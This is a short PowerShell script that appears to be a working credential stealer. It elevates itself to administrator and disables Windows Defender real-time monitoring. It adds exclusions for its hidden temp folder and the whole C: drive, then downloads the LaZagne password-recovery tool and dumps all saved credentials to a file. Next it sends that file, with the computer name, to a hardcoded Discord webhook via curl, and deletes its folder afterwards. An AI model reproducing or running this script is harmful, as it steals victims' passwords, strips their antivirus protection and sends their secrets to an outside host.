$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$windowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$dir = "$env:temp\JHknfuiD"
if (!(Test-Path -Path "$dir")) {
New-Item -ItemType Directory -Path "$dir"
}
if (-not $windowsPrincipal.IsInRole($adminRole)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    $arguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" } | Out-String
    $arguments = $arguments.Trim()
    Start-Process powershell.exe -Verb runAs -ArgumentList "-File `"$scriptPath`" $arguments"
    exit
}

if ($Admin -eq 'True') {
  Set-MpPreference -DisableRealtimeMonitoring $true

  Add-MpPreference -ExclusionPath "$dir"
  Add-MpPreference -ExclusionPath "C:\"
}
$log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
$verm = "v$version"
$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
$hide = Get-Item "$dir" -Force
$hide.attributes='Hidden'
Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\lazagne.exe"
& "$dir\lazagne.exe" all -vv > "$log"
curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
Start-Sleep -Seconds 20
$unhide = Get-Item "$dir" -Force
$unhide.attributes='Normal'
Remove-Item -Path "$dir" -Recurse -Force
